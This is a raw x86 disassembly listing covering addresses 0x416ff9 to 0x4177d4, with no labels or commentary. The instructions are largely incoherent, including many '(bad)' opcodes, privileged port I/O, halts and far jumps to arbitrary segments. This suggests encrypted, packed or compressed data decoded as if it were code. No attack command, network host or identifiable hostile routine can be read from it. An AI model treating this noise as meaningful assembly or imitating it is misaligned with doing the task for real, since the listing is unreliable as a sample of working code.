  416ff9:	sti    
  416ffa:	pop    ecx
  416ffb:	imul   ebx,esp,0x9bae3aa0
  417001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417002:	sbb    BYTE PTR [ecx],cl
  417004:	sbb    eax,0x4372d5db
  417009:	xchg   esp,eax
  41700a:	xchg   edi,eax
  41700b:	mov    ebx,fs
  41700d:	call   0x4a81:0x501ecd7d
  417014:	and    BYTE PTR [edx-0x4d],dh
  417017:	(bad)  
  417018:	mov    BYTE PTR [edi-0x1c9a61af],ah
  41701e:	es cld 
  417020:	mov    edx,0x51dcbbc7
  417025:	arpl   WORD PTR [eax-0x26],cx
  417028:	(bad)  
  417029:	cs and eax,0xde2e9cf2
  41702f:	stc    
  417030:	add    DWORD PTR [ebx-0x39],0xffffffef
  417034:	mov    al,0x27
  417036:	mov    eax,0x1e0a7eb3
  41703b:	push   esp
  41703c:	jo     0x417033
  41703e:	mov    eax,ds:0x9900b527
  417043:	sub    BYTE PTR [ecx+esi*4+0x54],0x7
  417048:	add    eax,0xd3d68f05
  41704d:	cmp    al,0x5a
  41704f:	or     ebp,DWORD PTR [esi+0x23]
  417052:	stc    
  417053:	je     0x417067
  417055:	mov    edx,0x40bfccc
  41705a:	sahf   
  41705b:	add    BYTE PTR [ebx],dh
  41705d:	adc    ebp,edi
  41705f:	cmp    edi,DWORD PTR [ebp-0x412e1645]
  417065:	in     eax,dx
  417066:	mov    eax,0xcc7daf04
  41706b:	pushf  
  41706c:	fcom   QWORD PTR ds:0x8abd1acb
  417072:	lods   eax,DWORD PTR ds:[esi]
  417073:	in     al,0xbb
  417075:	popf   
  417076:	mov    ebx,DWORD PTR [ecx]
  417078:	adc    ebp,0x3
  41707b:	pusha  
  41707c:	xlat   BYTE PTR ds:[ebx]
  41707d:	leave  
  41707e:	and    bl,dh
  417080:	xchg   esi,eax
  417081:	xchg   ebx,eax
  417082:	fsubr  DWORD PTR [ebx+0x22]
  417085:	push   cs
  417086:	sahf   
  417087:	aad    0xbd
  417089:	gs mov esp,0x17d36555
  41708f:	add    eax,0x8979cc08
  417094:	xchg   edi,ebp
  417096:	rcl    DWORD PTR ds:0x2477ae8c,0xf9
  41709d:	fs mov ebx,0x225102b3
  4170a3:	mov    dh,bl
  4170a5:	iret   
  4170a6:	lods   eax,DWORD PTR ds:[esi]
  4170a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170a8:	and    edx,DWORD PTR [esi-0x6f]
  4170ab:	jbe    0x417031
  4170ad:	test   al,0xb5
  4170af:	(bad)  
  4170b0:	fwait
  4170b1:	xchg   ebp,eax
  4170b2:	or     DWORD PTR ds:0x89dacb16,ebp
  4170b8:	mov    ecx,0xd041d70d
  4170bd:	(bad)  
  4170be:	and    al,0xcf
  4170c0:	mov    BYTE PTR [eax],ah
  4170c2:	adc    al,0x22
  4170c4:	push   ds
  4170c5:	xchg   edx,eax
  4170c6:	imul   esp,DWORD PTR [eax+0x7868793f],0xb6fe6aeb
  4170d0:	sub    al,0x6a
  4170d2:	xor    eax,0xb93ab4ec
  4170d7:	neg    ah
  4170d9:	fsub   QWORD PTR [ebp+0x6f8cf51a]
  4170df:	or     esp,esp
  4170e1:	rcr    DWORD PTR [ebp+0x34221e6a],0xf6
  4170e8:	cmp    BYTE PTR es:[esi],0xc2
  4170ec:	mov    ah,al
  4170ee:	rcr    esi,1
  4170f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170f1:	scas   al,BYTE PTR es:[edi]
  4170f2:	mov    DWORD PTR es:[eax-0x15],eax
  4170f6:	retf   
  4170f7:	push   eax
  4170f8:	call   0x24400b71
  4170fd:	adc    al,0xad
  4170ff:	test   al,cl
  417101:	mov    dl,BYTE PTR [ecx]
  417103:	ret    0xca95
  417106:	and    al,0x8b
  417108:	fstp   TBYTE PTR [ebx+0x340ce13b]
  41710e:	and    edi,ebx
  417110:	dec    ebx
  417111:	jno    0x4170c5
  417113:	cwde   
  417114:	in     eax,dx
  417115:	(bad)  
  417116:	mov    ds:0x15d7bee1,eax
  41711b:	adc    BYTE PTR [ebx+0x4f],ch
  41711e:	lods   al,BYTE PTR ds:[esi]
  41711f:	shl    DWORD PTR [edi],cl
  417121:	sbb    ch,BYTE PTR [ecx]
  417123:	out    dx,al
  417124:	mov    ebp,0x4aedf5fb
  417129:	(bad)  
  41712a:	mov    ds:0x39bbcf82,eax
  41712f:	fld    TBYTE PTR [eax]
  417131:	jle    0x4170ca
  417133:	xlat   BYTE PTR ds:[ebx]
  417134:	fs out dx,eax
  417136:	lds    edi,FWORD PTR [edx-0x1601330d]
  41713c:	sub    BYTE PTR ds:0x8db35d58,al
  417142:	sub    DWORD PTR [eax],esp
  417144:	bound  esi,QWORD PTR [eax+eiz*2+0x7be9d187]
  41714b:	jecxz  0x41716a
  41714d:	jbe    0x41710b
  41714f:	mov    ss,edx
  417151:	stc    
  417152:	mov    WORD PTR [ecx],fs
  417154:	xchg   edi,eax
  417155:	movaps XMMWORD PTR ds:0x4a09955d,xmm5
  41715c:	int3   
  41715d:	das    
  41715e:	inc    ebx
  41715f:	mov    al,ds:0x9ac0fbaf
  417164:	retf   
  417165:	pop    es
  417166:	push   edi
  417167:	in     al,dx
  417168:	stc    
  417169:	mul    al
  41716b:	sbb    bl,0xd3
  41716e:	and    cl,0x99
  417171:	inc    edx
  417172:	(bad)  
  417173:	fnsave es:[ebx]
  417176:	out    0x54,eax
  417178:	push   eax
  417179:	call   0xf3e8:0xe76d986
  417180:	dec    ecx
  417181:	mov    esi,DWORD PTR [esi-0x45]
  417184:	es (bad) 
  417186:	pop    ebx
  417187:	jo     0x4171ed
  417189:	mov    WORD PTR [eax-0x8],cs
  41718c:	jmp    0x417111
  41718e:	stc    
  41718f:	sbb    ah,ch
  417191:	cmp    eax,0xe4be148b
  417196:	push   esi
  417197:	mov    esp,0x76c5196e
  41719c:	jno    0x417126
  41719e:	jl     0x417180
  4171a0:	out    dx,al
  4171a1:	lods   al,BYTE PTR ds:[esi]
  4171a2:	hlt    
  4171a3:	mov    ah,0x7c
  4171a5:	cmp    al,0x59
  4171a7:	inc    edx
  4171a8:	repz dec edx
  4171aa:	sbb    dl,BYTE PTR [ecx+0x5f]
  4171ad:	dec    ebp
  4171ae:	ret    0xa54f
  4171b1:	mov    DWORD PTR [ebx+ecx*4-0x60],esi
  4171b5:	mov    bh,0xcd
  4171b7:	jmp    0x16a4e4f7
  4171bc:	add    al,0x75
  4171be:	inc    ebx
  4171bf:	out    dx,eax
  4171c0:	mov    eax,ds:0x73ce3cd6
  4171c5:	xchg   ebx,eax
  4171c6:	mov    es,WORD PTR [eax]
  4171c8:	jl     0x417234
  4171ca:	or     ebp,DWORD PTR [edi+0x697d0996]
  4171d0:	sar    BYTE PTR [eax-0x629c6272],cl
  4171d6:	cmc    
  4171d7:	mov    edi,0x1191df5d
  4171dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171dd:	imul   ecx,DWORD PTR [ebx+0x255c322e],0x14307b21
  4171e7:	lods   al,BYTE PTR ds:[esi]
  4171e8:	mov    al,0xa6
  4171ea:	stos   BYTE PTR es:[edi],al
  4171eb:	inc    edx
  4171ec:	cld    
  4171ed:	push   edi
  4171ee:	xor    ebp,DWORD PTR [ecx]
  4171f0:	lock out 0xcc,eax
  4171f3:	retf   
  4171f4:	push   edi
  4171f5:	cmp    bl,BYTE PTR [edx-0x585b51e6]
  4171fb:	cmp    DWORD PTR [ebp*8+0xd9f33bb],eax
  417202:	retf   
  417203:	adc    al,0x72
  417205:	nop
  417206:	push   ebp
  417207:	mov    edx,0x269289bb
  41720c:	sar    BYTE PTR [eax-0x10],cl
  41720f:	aad    0xa0
  417211:	scas   al,BYTE PTR es:[edi]
  417212:	pop    ecx
  417213:	inc    ebx
  417214:	shl    esp,1
  417216:	jnp    0x4171a5
  417218:	sub    ebx,eax
  41721a:	pop    edx
  41721b:	xchg   edx,eax
  41721c:	(bad)  
  41721d:	std    
  41721e:	cmp    eax,0x21b5b7c1
  417223:	xlat   BYTE PTR ds:[ebx]
  417224:	out    dx,eax
  417225:	mov    ds:0xd440d74f,eax
  41722a:	leave  
  41722b:	es inc ecx
  41722d:	jnp    0x4171dc
  41722f:	lods   al,BYTE PTR ds:[esi]
  417230:	int    0xd7
  417232:	or     al,0x70
  417234:	retf   
  417235:	(bad)  
  417236:	jns    0x4171fa
  417238:	push   ds
  417239:	hlt    
  41723a:	aas    
  41723b:	fistp  WORD PTR [ebx+ebp*4]
  41723e:	mov    BYTE PTR fs:[edx+0x5c],dh
  417242:	cmp    eax,0x3f793c94
  417247:	ret    
  417248:	call   DWORD PTR [eax-0x576f6927]
  41724e:	and    al,0x95
  417250:	lds    ebx,FWORD PTR [edi+0x63]
  417253:	mov    edx,0xcd44852
  417258:	and    eax,0x30b6cbe9
  41725d:	(bad)  
  41725e:	cmp    dh,BYTE PTR [ebx-0x20]
  417261:	cmp    DWORD PTR [ebx+0x56],edx
  417264:	dec    edx
  417265:	push   ss
  417266:	sub    al,0x7e
  417268:	out    0xda,eax
  41726a:	rcr    DWORD PTR [esi+0x64],cl
  41726d:	jmp    0x417281
  41726f:	lods   eax,DWORD PTR ds:[esi]
  417270:	iret   
  417271:	ror    BYTE PTR [edx],cl
  417273:	push   esp
  417274:	inc    eax
  417275:	das    
  417276:	loope  0x41728d
  417278:	int3   
  417279:	push   esp
  41727a:	sbb    DWORD PTR [esi+0x1ef2159f],eax
  417280:	rol    BYTE PTR [ebx+edx*8+0x3a],0xaa
  417285:	mov    ?,WORD PTR [edi-0x43732741]
  41728b:	test   DWORD PTR [eax+0x72dcb7b8],edx
  417291:	push   edi
  417292:	mov    eax,0x1e46792e
  417297:	fstp   DWORD PTR [edi+0x752f7a35]
  41729d:	xchg   esi,eax
  41729e:	out    dx,eax
  41729f:	sub    eax,0xad63548e
  4172a4:	and    edx,eax
  4172a6:	sahf   
  4172a7:	mov    edi,edx
  4172a9:	leave  
  4172aa:	push   edi
  4172ab:	outs   dx,DWORD PTR ds:[esi]
  4172ac:	test   DWORD PTR [esi-0x29],ebx
  4172af:	jmp    0x417268
  4172b1:	push   0x7bf1178a
  4172b6:	mov    eax,DWORD PTR [edi+0x706771fb]
  4172bc:	mov    ch,0x7f
  4172be:	pusha  
  4172bf:	mov    eax,DWORD PTR [edi]
  4172c1:	pop    edx
  4172c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172c3:	in     eax,0x12
  4172c5:	cdq    
  4172c6:	dec    ebp
  4172c7:	or     ch,cl
  4172c9:	loope  0x417325
  4172cb:	pop    ecx
  4172cc:	retf   0x5809
  4172cf:	or     DWORD PTR [esp+eiz*2+0x748e78cb],esi
  4172d6:	inc    eax
  4172d7:	dec    ecx
  4172d8:	mov    dh,0x2f
  4172da:	psubusw mm2,mm0
  4172dd:	mov    eax,0x66d0ab13
  4172e2:	adc    DWORD PTR [ebp-0x25d532f],esp
  4172e8:	cld    
  4172e9:	aaa    
  4172ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172eb:	jp     0x417345
  4172ed:	addr16 sub dh,dh
  4172f0:	mov    dh,BYTE PTR ds:0x519c3caf
  4172f6:	in     eax,dx
  4172f7:	pop    edx
  4172f8:	(bad)  
  4172f9:	dec    ebx
  4172fa:	add    ecx,DWORD PTR [edx+0x28]
  4172fd:	mov    dh,0x36
  4172ff:	pop    ecx
  417300:	lds    ebx,FWORD PTR [ecx-0x609d82b7]
  417306:	in     eax,dx
  417307:	mov    ds:0x9a102cb4,eax
  41730c:	sbb    eax,0x92c9519f
  417311:	jmp    0x59aa6ace
  417316:	(bad)  
  417318:	push   esi
  417319:	outs   dx,BYTE PTR ds:[esi]
  41731a:	inc    edi
  41731b:	std    
  41731c:	xchg   BYTE PTR [ebp+0x33],ch
  41731f:	fs jecxz 0x41731f
  417322:	pop    ss
  417323:	out    dx,al
  417324:	adc    DWORD PTR [ecx+0x76],edx
  417327:	sbb    esi,DWORD PTR [esp+ebx*1+0x3c266e27]
  41732e:	push   ecx
  41732f:	lea    ebx,ds:0x9fcb31aa
  417335:	scas   eax,DWORD PTR es:[edi]
  417336:	pop    ebp
  417337:	repnz mov ebx,0x70e93ce3
  41733d:	ret    
  41733e:	in     al,dx
  41733f:	cld    
  417340:	mov    esp,0x59738130
  417345:	or     ah,dl
  417347:	jle    0x417306
  417349:	sbb    ebx,DWORD PTR [ecx+0x67]
  41734c:	sahf   
  41734d:	aam    0xa3
  41734f:	mov    al,0x6a
  417351:	dec    esp
  417352:	pop    ebp
  417353:	mov    esp,0x85d248d3
  417358:	out    0xe7,eax
  41735a:	push   ss
  41735b:	fwait
  41735c:	loope  0x417313
  41735e:	mov    eax,0x243a05d4
  417363:	and    esi,DWORD PTR [eax+0x4296d92]
  417369:	mov    esi,0xb7f2d417
  41736e:	ss loope 0x41730d
  417371:	dec    esi
  417372:	fwait
  417373:	push   esp
  417374:	pop    ss
  417375:	fwait
  417376:	mov    ebp,0xa1007665
  41737b:	push   esi
  41737c:	jne    0x417339
  41737e:	xor    esp,0x36
  417381:	in     eax,dx
  417382:	inc    esi
  417383:	sahf   
  417384:	sub    ecx,DWORD PTR [ebx]
  417386:	inc    eax
  417387:	retf   
  417388:	addr16 gs ja 0x4173db
  41738c:	leave  
  41738d:	add    bl,BYTE PTR [eax+0x8]
  417390:	or     BYTE PTR [edi],0x15
  417393:	adc    DWORD PTR [ecx-0x27],edx
  417396:	mov    eax,ds:0x38285034
  41739b:	cmp    al,0xf5
  41739d:	fimul  WORD PTR [edx+0x2e]
  4173a0:	jbe    0x417415
  4173a2:	and    esi,edx
  4173a4:	add    ch,BYTE PTR [eax-0x40]
  4173a7:	in     eax,dx
  4173a8:	xor    eax,0xd8ce57a5
  4173ad:	dec    edx
  4173ae:	lea    esi,[ebx]
  4173b0:	xchg   ebp,eax
  4173b1:	call   0xd0d8336
  4173b6:	sub    ebp,DWORD PTR ds:0x43325bd5
  4173bc:	cmp    DWORD PTR [ecx+0x490a46e2],esp
  4173c2:	aas    
  4173c3:	not    BYTE PTR [edx+0x40]
  4173c6:	(bad)  
  4173c7:	nop
  4173c8:	mov    WORD PTR [eax+0x95839c1],es
  4173ce:	int3   
  4173cf:	mov    eax,ds:0xa981c3d1
  4173d4:	arpl   WORD PTR [ebp+0x65],cx
  4173d7:	push   edx
  4173d8:	lock pop esp
  4173da:	xchg   edx,eax
  4173db:	dec    edx
  4173dc:	cdq    
  4173dd:	test   esp,ecx
  4173df:	rcl    DWORD PTR [esi],0x52
  4173e2:	lods   eax,DWORD PTR ds:[esi]
  4173e3:	daa    
  4173e4:	dec    ecx
  4173e5:	cld    
  4173e6:	sbb    BYTE PTR [ebx+ebx*8+0x6d],0xd0
  4173eb:	push   edi
  4173ec:	mov    bl,0xa4
  4173ef:	cmp    DWORD PTR [ebp-0x65],esp
  4173f2:	aas    
  4173f3:	in     al,dx
  4173f4:	pop    eax
  4173f5:	fisub  WORD PTR [esi-0x63]
  4173f8:	arpl   si,dx
  4173fa:	clc    
  4173fb:	outs   dx,BYTE PTR ds:[esi]
  4173fc:	sub    cl,al
  4173fe:	test   al,0x40
  417400:	sub    al,BYTE PTR [esi]
  417402:	out    0x50,al
  417404:	mov    dh,0x7a
  417406:	jae    0x41740a
  417408:	sub    esi,esi
  41740a:	fs inc eax
  41740c:	push   ds
  41740d:	out    dx,eax
  41740e:	cmp    edi,DWORD PTR [esi]
  417410:	xchg   BYTE PTR [edx-0x2d],bh
  417413:	mov    ah,0x63
  417415:	sti    
  417416:	(bad)
  41741a:	scas   eax,DWORD PTR es:[edi]
  41741b:	mov    esp,0x9e88e1
  417420:	add    al,0xb6
  417422:	ret    
  417423:	mov    ah,BYTE PTR [eax+0xc]
  417426:	into   
  417427:	icebp  
  417428:	dec    ecx
  417429:	cld    
  41742a:	mov    ecx,DWORD PTR [ebp+esi*8+0xef19078]
  417431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417432:	jge    0x41749d
  417434:	in     al,dx
  417435:	inc    ebx
  417436:	jns    0x4173cf
  417438:	loopne 0x417454
  41743a:	adc    DWORD PTR [ebx-0x65cda31],edi
  417440:	mov    dl,BYTE PTR [ecx]
  417442:	out    dx,eax
  417443:	es add bl,cl
  417446:	sbb    eax,0x4e5b5ebb
  41744b:	jnp    0x417447
  41744d:	sub    edi,ebx
  41744f:	test   eax,0xde1c40ac
  417454:	retf   0xcd0b
  417457:	add    al,0xc0
  417459:	retf   0xab48
  41745c:	jge    0x4173df
  41745e:	sti    
  41745f:	in     eax,0x31
  417461:	iret   
  417462:	ss ret 0xf370
  417466:	inc    esi
  417467:	lods   eax,DWORD PTR ds:[esi]
  417468:	shr    DWORD PTR [edx-0x1133e807],cl
  41746e:	lock jmp 0x6afa:0xb754843
  417476:	pop    ebx
  417477:	jbe    0x417400
  417479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747a:	jl     0x4174dc
  41747c:	retf   
  41747d:	xor    eax,0xa0a4c5c8
  417482:	mov    cs,ebp
  417484:	lds    eax,FWORD PTR [esi+edi*8+0x6cfd1681]
  41748b:	lea    eax,[eax-0x2d]
  41748e:	test   al,0x96
  417490:	jnp    0x4174e3
  417492:	push   edi
  417493:	imul   eax,edx,0x3697118d
  417499:	fld    TBYTE PTR [ebx]
  41749b:	cmp    al,0xf0
  41749d:	dec    eax
  41749e:	push   es
  41749f:	in     al,0x14
  4174a1:	(bad)  
  4174a2:	into   
  4174a3:	dec    ebx
  4174a4:	xor    ch,al
  4174a6:	jb     0x4174bd
  4174a8:	test   edx,ebx
  4174aa:	and    DWORD PTR [edx-0x28],ebp
  4174ad:	dec    ecx
  4174ae:	sahf   
  4174af:	adc    dh,BYTE PTR [ebp+0x4f]
  4174b2:	imul   ebp,DWORD PTR [esi],0xf97f7ed2
  4174b8:	cld    
  4174b9:	(bad)  
  4174bb:	ss sti 
  4174bd:	test   eax,0x991c91c9
  4174c2:	jp     0x41745e
  4174c4:	lods   eax,DWORD PTR ss:[esi]
  4174c6:	mov    fs,WORD PTR [edi]
  4174c8:	arpl   WORD PTR [ebx+0x40fed7da],sp
  4174ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174cf:	mov    esi,0xf0bceaca
  4174d4:	fcom   QWORD PTR [ecx-0xb6615da]
  4174da:	sub    al,0x3c
  4174dc:	sub    BYTE PTR [ebx],ch
  4174de:	imul   eax,ebp,0x7fb8de7d
  4174e4:	cli    
  4174e5:	test   DWORD PTR [edx+0x63557fab],esi
  4174eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ec:	sbb    bh,bl
  4174ee:	sub    BYTE PTR [edx-0xf],bh
  4174f1:	xchg   esi,eax
  4174f2:	mov    cl,0x73
  4174f4:	leave  
  4174f5:	jns    0x4174bc
  4174f7:	cld    
  4174f8:	dec    esi
  4174f9:	lods   eax,DWORD PTR ds:[esi]
  4174fa:	test   eax,0x255b87c
  4174ff:	mov    ebx,0xae31f99
  417504:	clc    
  417505:	jno    0x4174b3
  417507:	out    0x9a,al
  417509:	and    DWORD PTR ds:0xc08e6ad1,ebp
  41750f:	mov    ecx,0x37ecbe0c
  417514:	add    al,BYTE PTR [esi+0x574a2204]
  41751a:	test   DWORD PTR [ebx+0x5],esi
  41751d:	and    ecx,DWORD PTR [ebx]
  41751f:	loopne 0x417547
  417521:	shl    BYTE PTR [edx],cl
  417523:	in     al,dx
  417524:	add    BYTE PTR ds:0xf7bb0278,bh
  41752a:	pop    ebx
  41752b:	data16 or dl,0xaa
  41752f:	mov    ebp,0x272dc513
  417534:	sti    
  417535:	ret    
  417536:	test   al,0xb6
  417538:	xchg   esp,eax
  417539:	cs jb  0x4174cb
  41753c:	aas    
  41753d:	test   BYTE PTR [edx+0x24],bh
  417540:	stos   BYTE PTR es:[edi],al
  417541:	xor    ebx,ecx
  417543:	inc    esp
  417544:	arpl   WORD PTR [ebp-0x22],dx
  417547:	mov    DWORD PTR [ecx+0x6526dd22],ecx
  41754d:	pop    eax
  41754e:	out    0xe6,al
  417550:	cmp    al,0x37
  417552:	cmp    al,0x1a
  417554:	pop    eax
  417555:	xchg   esi,eax
  417556:	inc    ecx
  417557:	xchg   al,dl
  417559:	and    BYTE PTR [eax],al
  41755b:	push   ds
  41755c:	adc    DWORD PTR [eax],esp
  41755e:	push   esp
  41755f:	cmp    BYTE PTR ds:0x2910b840,bl
  417565:	loopne 0x417564
  417567:	fwait
  417568:	imul   esp,esi,0xffffffb6
  41756b:	dec    ebx
  41756c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41756d:	sbb    edi,DWORD PTR [esi-0x5f]
  417570:	xor    eax,0x66b92696
  417575:	inc    edx
  417576:	adc    cl,BYTE PTR [ecx]
  417578:	ins    DWORD PTR es:[edi],dx
  417579:	into   
  41757a:	xchg   ebp,eax
  41757b:	ror    cl,1
  41757d:	lahf   
  41757e:	or     eax,0x70445bfe
  417583:	xor    al,BYTE PTR [ebx+eiz*1+0x16af72ca]
  41758a:	mov    bl,0x6
  41758c:	push   es
  41758d:	cmp    DWORD PTR ds:0x53b2d91d,edx
  417593:	dec    dh
  417595:	test   ch,0xa8
  417598:	rcr    esp,cl
  41759a:	sbb    al,BYTE PTR [ebx+ebp*4]
  41759d:	push   ecx
  41759e:	xchg   ebp,eax
  41759f:	mov    dh,0x33
  4175a1:	inc    ecx
  4175a2:	(bad)  
  4175a3:	mov    edi,0x85c558c1
  4175a8:	les    esi,FWORD PTR [eax+ebx*1+0x97e3f8a]
  4175af:	xor    BYTE PTR [ebp+0x5329dca8],bl
  4175b5:	in     eax,dx
  4175b6:	nop
  4175b7:	inc    edi
  4175b8:	retf   0xbd59
  4175bb:	int3   
  4175bc:	mov    ch,bl
  4175be:	mov    esi,?
  4175c0:	in     al,dx
  4175c1:	jl     0x4175f3
  4175c3:	inc    edi
  4175c4:	jno    0x4175fc
  4175c6:	les    ebp,FWORD PTR [eax+edi*8+0x24]
  4175ca:	pusha  
  4175cb:	int    0xf8
  4175cd:	imul   esi,DWORD PTR [esi],0xf799dd63
  4175d3:	sti    
  4175d4:	pop    esp
  4175d5:	ss adc al,0x48
  4175d8:	pop    esi
  4175d9:	sub    edx,ebp
  4175db:	mov    BYTE PTR ds:0x86e12df,al
  4175e1:	jg     0x41758e
  4175e3:	aad    0x40
  4175e5:	das    
  4175e6:	iret   
  4175e7:	xor    al,0x42
  4175e9:	or     ebp,esi
  4175eb:	mov    eax,ds:0xd04bfce8
  4175f0:	mov    edi,0x4872c8e8
  4175f5:	ret    
  4175f6:	mov    eax,ds:0x98588761
  4175fb:	push   ds
  4175fc:	fs cmp dh,ah
  4175ff:	daa    
  417600:	jmp    0x2546a66d
  417605:	sbb    cl,ch
  417607:	jp     0x4175d4
  417609:	dec    ecx
  41760a:	ins    DWORD PTR es:[edi],dx
  41760b:	push   0x23
  41760d:	xchg   esi,eax
  41760e:	inc    edi
  41760f:	push   ebp
  417610:	pop    es
  417611:	xchg   esi,eax
  417612:	push   es
  417613:	push   es
  417614:	mov    bh,0x72
  417616:	xchg   edi,eax
  417617:	push   ss
  417618:	lea    ebx,[ebp-0x140bbb6f]
  41761e:	pop    esp
  41761f:	in     eax,0xe9
  417621:	repnz sub BYTE PTR [ebx-0x77e3f11],0xcf
  417629:	lods   eax,DWORD PTR ds:[esi]
  41762a:	mov    al,BYTE PTR [ebx+0x49284802]
  417630:	cs pop edi
  417632:	sar    DWORD PTR [ebp-0x25],cl
  417635:	sub    esp,DWORD PTR [ebx*8+0x493c45b2]
  41763c:	mov    eax,ds:0xe4a23b5c
  417641:	or     DWORD PTR [ebp-0x269965c3],esi
  417647:	sub    BYTE PTR [edx],0xd7
  41764a:	pop    es
  41764b:	xlat   BYTE PTR ds:[ebx]
  41764c:	inc    ecx
  41764d:	fldl2t 
  41764f:	jae    0x417665
  417651:	cmp    dh,BYTE PTR [esi]
  417653:	in     eax,0xce
  417655:	fimul  DWORD PTR [ebp+0x5300ff2]
  41765b:	loope  0x417685
  41765d:	push   es
  41765e:	(bad)  
  417660:	lock lahf 
  417662:	popf   
  417663:	aad    0x84
  417665:	or     DWORD PTR [edi-0x5572b8d6],0x9
  41766c:	or     al,0xdc
  41766e:	repnz cli 
  417670:	(bad)  
  417671:	lock shl BYTE PTR [ebx],cl
  417674:	or     al,0x66
  417676:	mov    ecx,0x3433a538
  41767b:	dec    esi
  41767c:	(bad)
  41767f:	dec    edx
  417680:	in     al,0xbc
  417682:	push   edx
  417683:	xchg   edx,eax
  417684:	sub    BYTE PTR [esi-0x7031af03],al
  41768a:	popf   
  41768b:	adc    eax,esi
  41768d:	and    eax,0x42456285
  417692:	lds    eax,FWORD PTR [ecx+ebp*1+0x34]
  417696:	xchg   al,dl
  417698:	in     al,dx
  417699:	mov    ebp,0xcf5e44ff
  41769e:	hlt    
  41769f:	out    dx,eax
  4176a0:	xchg   edi,eax
  4176a1:	push   ebx
  4176a2:	and    BYTE PTR [ecx],bh
  4176a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a5:	cmp    ch,BYTE PTR [edi]
  4176a7:	inc    edx
  4176a8:	retf   0x2e59
  4176ab:	gs add eax,0x15220fc0
  4176b1:	loop   0x4176b0
  4176b3:	push   eax
  4176b4:	sub    BYTE PTR [esi+0x36],dl
  4176b7:	fisubr WORD PTR [ecx]
  4176b9:	shl    DWORD PTR [ecx+0x60adb66e],1
  4176bf:	mov    ebx,0x4955bcb2
  4176c4:	jmp    0xb6d7ba4e
  4176c9:	mov    ecx,DWORD PTR [ecx+0x1b882334]
  4176cf:	jl     0x417738
  4176d1:	(bad)  
  4176d3:	mov    ch,0x33
  4176d5:	mov    ebp,0xd9db06df
  4176da:	jg     0x4176be
  4176dc:	mov    bh,0xff
  4176de:	ret    
  4176df:	das    
  4176e0:	push   edi
  4176e1:	push   0xffffff81
  4176e3:	jg     0x41768b
  4176e5:	cld    
  4176e6:	xchg   BYTE PTR [esi-0x21ea221c],bl
  4176ec:	ins    BYTE PTR es:[edi],dx
  4176ed:	cmc    
  4176ee:	loopne 0x417677
  4176f0:	ja     0x417709
  4176f2:	dec    edi
  4176f3:	popf   
  4176f4:	or     al,0xc7
  4176f6:	ret    0x9bc8
  4176f9:	adc    eax,0xc1826375
  4176fe:	jno    0x417718
  417700:	shl    DWORD PTR [ecx-0x1e918767],0x8e
  417707:	out    dx,al
  417708:	popa   
  417709:	xor    BYTE PTR [esi],cl
  41770b:	or     esp,DWORD PTR [esi]
  41770d:	mov    eax,ds:0x13743edb
  417712:	and    ebp,ecx
  417714:	daa    
  417715:	cld    
  417716:	jns    0x41770a
  417718:	(bad)  
  41771a:	outs   dx,BYTE PTR ds:[esi]
  41771b:	rcl    BYTE PTR [edx+0x1c],1
  41771e:	xor    esp,edx
  417720:	ds inc ebx
  417722:	test   BYTE PTR [edi+0x32188e68],bh
  417728:	inc    ebp
  417729:	daa    
  41772a:	outs   dx,BYTE PTR ds:[esi]
  41772b:	xchg   DWORD PTR [esi-0x70],esp
  41772e:	jae    0x417776
  417730:	aad    0x52
  417732:	cmp    ah,bh
  417734:	push   ebx
  417735:	sub    BYTE PTR [edx+0xc],bh
  417738:	mov    gs,edx
  41773a:	or     eax,0xb2fc54ce
  41773f:	mov    ch,BYTE PTR [eax]
  417741:	xchg   edi,eax
  417742:	push   0x73db7f0c
  417747:	push   ds
  417748:	cdq    
  417749:	test   DWORD PTR [eax],esp
  41774b:	and    eax,0x8d34d644
  417750:	cdq    
  417751:	xor    BYTE PTR [ebx],al
  417753:	xchg   ch,dl
  417755:	ins    BYTE PTR es:[edi],dx
  417756:	imul   ebp,DWORD PTR [esi+0x62],0xffffffeb
  41775a:	dec    esp
  41775b:	jmp    0xc760:0x86f10724
  417762:	sub    BYTE PTR [esi],0x29
  417765:	mov    al,ss:0x5429fb1f
  41776b:	icebp  
  41776c:	mov    cs,WORD PTR [eax+0x49]
  41776f:	mov    bl,ah
  417771:	scas   eax,DWORD PTR es:[edi]
  417772:	cmp    eax,0x872d4bb4
  417777:	xchg   DWORD PTR [eax],edx
  417779:	sbb    edi,DWORD PTR [esi]
  41777b:	das    
  41777c:	cmp    al,0x66
  41777e:	cmp    BYTE PTR [edi+0x78],dh
  417781:	or     edx,ebx
  417783:	retf   0x7c4d
  417786:	adc    al,0x68
  417788:	repz fisub WORD PTR [ebx-0x19de6d80]
  41778f:	add    ecx,eax
  417791:	mov    edi,0x2cb724d2
  417796:	or     dh,BYTE PTR [edi+ebx*1]
  417799:	or     DWORD PTR cs:[ebp+0x2bfa3f00],ebx
  4177a0:	sub    DWORD PTR [ebx-0x2b],edx
  4177a3:	pop    esi
  4177a4:	inc    ebp
  4177a5:	cmp    DWORD PTR [esi],ebx
  4177a7:	adc    DWORD PTR [eax-0xf],edx
  4177aa:	jecxz  0x417798
  4177ac:	cmp    dh,ah
  4177ae:	hlt    
  4177af:	push   edi
  4177b0:	sub    dh,cl
  4177b2:	and    dl,ah
  4177b4:	(bad)  
  4177b5:	das    
  4177b6:	mov    dh,0xa4
  4177b8:	add    BYTE PTR [esi+0x68],0x37
  4177bc:	pushf  
  4177bd:	or     DWORD PTR [esi],ebp
  4177bf:	or     cl,BYTE PTR [edi+0x14]
  4177c2:	pop    ds
  4177c3:	adc    DWORD PTR [edx+0x78d6640d],ebp
  4177c9:	int3   
  4177ca:	pop    ebx
  4177cb:	or     al,0x51
  4177cd:	push   esp
  4177ce:	sbb    ebx,DWORD PTR [ecx]
  4177d0:	pushaw 
  4177d2:	fld    TBYTE PTR [edi]
  4177d4:	test   DWORD PTR [esi],edi
